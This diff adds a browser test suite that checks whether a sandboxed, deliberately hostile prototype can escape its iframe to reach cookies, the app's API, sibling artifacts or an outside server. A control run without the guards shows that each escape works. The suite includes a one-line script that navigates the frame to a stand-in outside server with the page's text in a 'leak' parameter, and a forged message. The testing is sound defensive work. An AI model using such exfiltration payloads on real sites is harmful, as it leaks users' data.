@@ -1,0 +1,264 @@
+// Escape tests in a real browser (ORC-029 pass 3, 3b; spec section 6, Safety): a hostile prototype, served by the
+// prototype server and framed by an app page with sandbox="allow-scripts", tries to reach the app's API, the
+// network and a sibling artifact, to use cookies and storage, to submit a form, to navigate the app's window and to
+// pass the app messages that are not pins. Every attempt must fail. The checks look at the effects (what the app's
+// server, an outside server, the prototype server and the browser received), not only at the prototype's own
+// record. A control runs the same prototype without the guards and shows each of those effects does appear, so
+// the checks can see an escape.
+//
+// The browser is the system Chrome through playwright-core (CHROME_PATH or the installed Google Chrome). Without
+// it these tests are skipped, with the reason printed.
+
+import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { createServer, type Server } from "node:http";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import type { Browser, BrowserContext, Frame, Page } from "playwright-core";
+import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { acceptPinMessage, prototypeOrigin } from "../../src/runtime/prototype";
+import { createHttpServer } from "../http";
+import { FakeAdapter, defaultFakeConfig } from "../runtimes/fake";
+import { Scheduler } from "../scheduler";
+import { Store } from "../store";
+import { createPrototypeServer } from "./serve";
+import { launchChrome } from "./shots";
+import { TINY_PNG, close, listen, writeVersion } from "./testFixtures";
+
+const chrome = await launchChrome();
+const browser: Browser | undefined = "browser" in chrome ? chrome.browser : undefined;
+// Written straight to stderr: the test runner shows no console output from a skipped file.
+if (!browser) process.stderr.write(`Skipping the prototype escape tests in a real browser: ${"missing" in chrome ? chrome.missing : ""}. Install Google Chrome or set CHROME_PATH.\n`);
+
+const FIXTURES = join(import.meta.dirname, "fixtures");
+const HOSTILE = { "a/index.html": readFileSync(join(FIXTURES, "hostile", "index.html")), "a/hostile.js": readFileSync(join(FIXTURES, "hostile", "hostile.js")), "a/style.css": readFileSync(join(FIXTURES, "hostile", "style.css")) };
+const SIBLING = { "a/index.html": "<p>The sibling</p>", "a/secret.txt": "sibling secret", "a/secret.js": readFileSync(join(FIXTURES, "sibling", "secret.js")), "a/secret.png": TINY_PNG };
+/** A prototype that navigates its own frame to the outside server, with its text in the URL: no policy of its own can stop that. */
+const NAVIGATOR = {
+  "a/index.html": "<p>Navigating</p><script src=\"nav.js\"></script>",
+  "a/nav.js": "setTimeout(function () { location.href = new URLSearchParams(location.search).get('ext') + '/self?leak=' + encodeURIComponent(document.body.innerText); }, 200);",
+};
+const COOKIE = { name: "session", value: "app-secret" };
+
+let root: string;
+let store: Store;
+let app: Server, control: Server, prototypes: Server, outside: Server;
+let appPort: number, controlPort: number, protoPort: number, extPort: number;
+/** What each server received: path (and Host for the prototype server, with the status it answered). */
+const appRequests: string[] = [];
+const outsideRequests: string[] = [];
+const protoRequests: { host: string; url: string; status: number }[] = [];
+
+/** An app page (served by the app's own server) that frames `src` like the studio will, and takes pins through acceptPinMessage. */
+function appPage(src: string, sandbox: boolean): string {
+  const attr = sandbox ? ' sandbox="allow-scripts"' : "";
+  return `<!doctype html><html><head><meta charset="utf-8"><title>App page</title></head><body>
+<script>
+const acceptPinMessage = ${acceptPinMessage.toString()};
+window.__messages = [];
+window.__pins = [];
+addEventListener("message", (e) => {
+  const frame = document.getElementById("prototype").contentWindow;
+  const pin = acceptPinMessage(e, frame);
+  window.__messages.push({ fromPrototype: e.source === frame, accepted: pin !== null, data: e.data });
+  if (pin) window.__pins.push(pin);
+});
+</script>
+<iframe id="prototype"${attr} src="${src}" style="width: 900px; height: 600px"></iframe>
+<iframe id="forger" sandbox="allow-scripts" srcdoc="<script>parent.postMessage({ type: 'orchestrator-pin', x: 0.5, y: 0.5, selector: 'forged' }, '*')</script>"></iframe>
+</body></html>`;
+}
+
+beforeAll(async () => {
+  if (!browser) return;
+  root = mkdtempSync(join(tmpdir(), "orch-escape-"));
+  const studio = join(root, "studio", "p-test");
+  writeVersion(studio, "sa-1", 1, HOSTILE);
+  writeVersion(studio, "sa-2", 1, SIBLING);
+  writeVersion(studio, "sa-3", 1, NAVIGATOR);
+
+  // The app: the real service's HTTP server, serving a stand-in for the studio page from its static folder. The
+  // controls use a second one without the prototype port, so its pages carry no frame policy.
+  const staticDir = join(root, "static");
+  // The ports first: the allowed Host and the prototypes' frame-ancestors name them.
+  const free = async () => {
+    const probe = createServer();
+    const p = await listen(probe);
+    await close(probe);
+    return p;
+  };
+  appPort = await free();
+  controlPort = await free();
+  store = new Store(join(root, "test.db"));
+  const config = defaultFakeConfig();
+  const scheduler = new Scheduler(store, { claude: new FakeAdapter("claude", config), codex: new FakeAdapter("codex", config) });
+  outside = createServer((req, res) => {
+    outsideRequests.push(`${req.method} ${req.url}`);
+    res.writeHead(200, { "Content-Type": "text/html" });
+    res.end(req.url === "/framer" ? `<iframe sandbox="allow-scripts" src="${prototypeOrigin("sa-1", 1, protoPort)}/a/index.html"></iframe>` : "outside");
+  });
+  outside.on("upgrade", (req, socket) => {
+    outsideRequests.push(`UPGRADE ${req.url}`);
+    socket.destroy();
+  });
+  extPort = await listen(outside);
+  prototypes = createPrototypeServer({ studioDir: () => studio, appOrigins: [`http://127.0.0.1:${appPort}`, `http://localhost:${appPort}`, `http://127.0.0.1:${controlPort}`] });
+  prototypes.on("request", (req, res) => res.on("finish", () => protoRequests.push({ host: req.headers.host ?? "", url: req.url ?? "", status: res.statusCode })));
+  protoPort = await listen(prototypes);
+
+  const query = (appOrigin: string) => `?app=${encodeURIComponent(appOrigin)}&ext=${encodeURIComponent(`http://127.0.0.1:${extPort}`)}&sibling=${encodeURIComponent(prototypeOrigin("sa-2", 1, protoPort))}`;
+  const guarded = query(`http://127.0.0.1:${appPort}`);
+  cpSync(join(FIXTURES, "hostile"), join(staticDir, "unguarded"), { recursive: true });
+  writeFileSync(join(staticDir, "index.html"), appPage(`${prototypeOrigin("sa-1", 1, protoPort)}/a/index.html${guarded}`, true));
+  writeFileSync(join(staticDir, "control.html"), appPage(`/unguarded/index.html${query(`http://127.0.0.1:${controlPort}`)}`, false));
+  writeFileSync(join(staticDir, "navigate.html"), appPage(`${prototypeOrigin("sa-3", 1, protoPort)}/a/index.html${guarded}`, true));
+  const startedAt = new Date().toISOString();
+  app = createHttpServer({ store, scheduler, startedAt, allowedHosts: [`127.0.0.1:${appPort}`], staticDir, prototypePort: protoPort });
+  control = createHttpServer({ store, scheduler, startedAt, allowedHosts: [`127.0.0.1:${controlPort}`], staticDir });
+  for (const [s, p] of [[app, appPort], [control, controlPort]] as const) {
+    s.on("request", (req) => appRequests.push(req.url ?? ""));
+    await new Promise<void>((r) => s.listen(p, "127.0.0.1", r));
+  }
+}, 30_000);
+
+afterAll(async () => {
+  await browser?.close();
+  for (const s of [app, control, prototypes, outside]) await close(s);
+  store?.close();
+  if (root) rmSync(root, { recursive: true, force: true });
+});
+
+/** A browser context with the app's cookie, where every request is recorded and none reaches the internet. */
+async function newContext(): Promise<{ context: BrowserContext; page: Page; seen: string[] }> {
+  const context = await browser!.newContext();
+  await context.addCookies([{ ...COOKIE, domain: "127.0.0.1", path: "/" }]);
+  const seen: string[] = [];
+  await context.route("**/*", (route) => {
+    const url = route.request().url();
+    seen.push(url);
+    return url.startsWith("http://127.0.0.1:") || url.includes(".localhost:") ? route.continue() : route.fulfill({ status: 200, body: "the internet" });
+  });
+  return { context, page: await context.newPage(), seen };
+}
+
+async function prototypeFrame(page: Page, prefix: string): Promise<Frame> {
+  let frame: Frame | undefined;
+  await expect.poll(() => (frame = page.frames().find((f) => f.url().startsWith(prefix))), { timeout: 10_000 }).toBeTruthy();
+  // A function, not source: waiting on source evaluates a string in the page, which the prototype's policy refuses.
+  await frame!.waitForFunction(() => (globalThis as { __done?: boolean }).__done === true, undefined, { timeout: 15_000 });
+  return frame!;
+}
+
+/** Evaluates `expr` (JavaScript source) in a page or a frame. Source, not a function: the server's TypeScript has no DOM types. */
+const js = <T>(target: Page | Frame, expr: string) => target.evaluate(expr) as Promise<T>;
+const attemptsIn = (frame: Frame) => js<Record<string, string | boolean>>(frame, "window.__attempts");
+
+describe.skipIf(!browser)("a hostile prototype in the app's sandboxed frame", () => {
+  it("cannot reach the app's API, the network or a sibling artifact, use cookies, submit a form, navigate the app or pass a non-pin message", async () => {
+    const { context, page, seen } = await newContext();
+    const start = { app: appRequests.length, outside: outsideRequests.length, proto: protoRequests.length };
+    const appUrl = `http://127.0.0.1:${appPort}/`;
+    await page.goto(appUrl);
+    const origin = prototypeOrigin("sa-1", 1, protoPort);
+    const frame = await prototypeFrame(page, origin);
+
+    // It ran: its own script, its own stylesheet and the pin script loaded from its own origin.
+    const attempts = await attemptsIn(frame);
+    expect(Object.keys(attempts).length).toBeGreaterThanOrEqual(20);
+    expect(await js(frame, 'getComputedStyle(document.querySelector("main")).color')).toBe("rgb(1, 2, 3)");
+
+    // Cookies and storage, observed directly in the frame: its origin is opaque.
+    expect(await js(frame, "(() => { try { return document.cookie; } catch (e) { return e.name; } })()")).toBe("SecurityError");
+    expect([attempts.readCookie, attempts.setCookie, attempts.localStorage]).toEqual(["blocked: SecurityError", "blocked: SecurityError", "blocked: SecurityError"]);
+    // The sibling's script never ran here.
+    expect(await js(frame, "window.__siblingRan ?? false")).toBe(false);
+
+    // The owner's click is the one message the app accepts.
+    await frame.click("main > button:nth-of-type(2)");
+    const where = await js<{ x: number; y: number }>(
+      frame,
+      `(() => {
+        const r = document.querySelector("main > button:nth-of-type(2)").getBoundingClientRect();
+        const d = document.documentElement;
+        return { x: (r.left + r.width / 2 + scrollX) / d.scrollWidth, y: (r.top + r.height / 2 + scrollY) / d.scrollHeight };
+      })()`,
+    );
+    await expect.poll(() => js(page, "window.__pins.length")).toBe(1);
+    const [pin] = await js<{ type: string; x: number; y: number; selector: string }[]>(page, "window.__pins");
+    expect(pin.type).toBe("orchestrator-pin");
+    expect(pin.selector).toBe("html > body > main > button:nth-of-type(2)");
+    expect(pin.x).toBeCloseTo(where.x, 2);
+    expect(pin.y).toBeCloseTo(where.y, 2);
+
+    // Its messages that are not pins arrived and were refused; so was a well-formed pin from another frame.
+    const messages = await js<{ fromPrototype: boolean; accepted: boolean; data: unknown }[]>(page, "window.__messages");
+    const fromPrototype = messages.filter((m) => m.fromPrototype);
+    expect(fromPrototype.filter((m) => !m.accepted)).toHaveLength(12); // six kinds, each to parent and to top
+    expect(fromPrototype.filter((m) => m.accepted).map((m) => m.data)).toEqual([pin]);
+    expect(messages.filter((m) => !m.fromPrototype)).toEqual([{ fromPrototype: false, accepted: false, data: { type: "orchestrator-pin", x: 0.5, y: 0.5, selector: "forged" } }]);
+
+    // Navigating the app's window, attempted last, failed.
+    await frame.waitForFunction(() => "navigateTop" in (globalThis as unknown as { __attempts: object }).__attempts, undefined, { timeout: 5_000 });
+    await page.waitForTimeout(500);
+    expect(page.url()).toBe(appUrl);
+    expect((await attemptsIn(frame)).openWindow).toBe("succeeded: null");
+
+    // What reached anything: the app's server served its page only; the outside server and the internet got nothing;
+    // the prototype server got nothing for the sibling, and the path tricks on its own origin found nothing.
+    expect(appRequests.slice(start.app)).toEqual(["/"]);
+    expect(outsideRequests.slice(start.outside)).toEqual([]);
+    expect(seen.filter((u) => !u.startsWith(appUrl) && !u.startsWith(`${origin}/`))).toEqual([]);
+    const proto = protoRequests.slice(start.proto).map((r) => `${r.host} ${r.url.split("?")[0]} ${r.status}`);
+    const own = `p-sa-1-v1.localhost:${protoPort}`;
+    // (Both path tricks normalise to the same URL, which Chrome may fetch once.)
+    expect([...new Set(proto)].sort()).toEqual([`${own} /__orchestrator/pin.js 200`, `${own} /a/hostile.js 200`, `${own} /a/index.html 200`, `${own} /a/style.css 200`, `${own} /sa-2/v1/a/secret.js 404`]);
+    expect(await context.cookies()).toEqual([expect.objectContaining(COOKIE)]);
+    await context.close();
+  }, 60_000);
+
+  it("cannot navigate its own frame away: the app page's frame-src stops it (and without it, it would)", async () => {
+    const navigated: string[][] = [];
+    for (const guarded of [true, false]) {
+      const { context, page } = await newContext();
+      const start = { outside: outsideRequests.length, proto: protoRequests.length };
+      const response = await page.goto(`http://127.0.0.1:${guarded ? appPort : controlPort}/navigate.html`);
+      expect(response?.headers()["content-security-policy"]).toBe(guarded ? `frame-src http://*.localhost:${protoPort}` : undefined);
+      // The prototype loaded and its script ran, in both.
+      await expect.poll(() => protoRequests.slice(start.proto).some((r) => r.host === `p-sa-3-v1.localhost:${protoPort}` && r.url === "/a/nav.js" && r.status === 200), { timeout: 5_000 }).toBe(true);
+      await page.waitForTimeout(1000);
+      navigated.push(outsideRequests.slice(start.outside));
+      await context.close();
+    }
+    expect(navigated).toEqual([[], ["GET /self?leak=Navigating"]]);
+  }, 30_000);
+
+  it("is not shown at all when a page other than the app frames it", async () => {
+    const { context, page } = await newContext();
+    const start = protoRequests.length;
+    await page.goto(`http://127.0.0.1:${extPort}/framer`);
+    await page.waitForTimeout(1500);
+    // The prototype server answered; the browser did not show the page in that frame.
+    expect(protoRequests.slice(start).map((r) => `${r.url} ${r.status}`)).toEqual(["/a/index.html 200"]);
+    const frame = page.frames()[1];
+    expect(frame.url()).not.toContain(".localhost:");
+    expect(await js(frame, "window.__attempts ?? null").catch(() => null)).toBeNull();
+    await context.close();
+  }, 30_000);
+
+  it("control: the same prototype without the guards does reach each of them, so the checks above can see an escape", async () => {
+    const { context, page, seen } = await newContext();
+    const start = { app: appRequests.length, outside: outsideRequests.length, proto: protoRequests.length };
+    // The control's app page has no frame policy, and frames the prototype from its own origin without a sandbox.
+    await page.goto(`http://127.0.0.1:${controlPort}/control.html`);
+    const frame = await prototypeFrame(page, `http://127.0.0.1:${controlPort}/unguarded/`);
+    const attempts = await attemptsIn(frame);
+    expect(attempts.readCookie).toBe(`succeeded: ${JSON.stringify(`${COOKIE.name}=${COOKIE.value}`)}`);
+    expect(attempts.fetchAppApi).toBe("succeeded: status 200 basic");
+    expect(await js(frame, "window.__siblingRan ?? false")).toBe(true);
+    await page.waitForURL(`http://127.0.0.1:${extPort}/top`, { timeout: 5_000 });
+    expect(appRequests.slice(start.app)).toContain("/api/state");
+    expect(outsideRequests.slice(start.outside)).toEqual(expect.arrayContaining(["GET /fetch", "GET /image", "POST /form", "POST /beacon", "GET /top"]));
+    expect(seen).toContain("https://example.com/orchestrator-escape");
+    expect(protoRequests.slice(start.proto).map((r) => `${r.host} ${r.url} ${r.status}`)).toEqual(expect.arrayContaining([`p-sa-2-v1.localhost:${protoPort} /a/secret.js 200`]));
+    await context.close();
+  }, 60_000);
+});
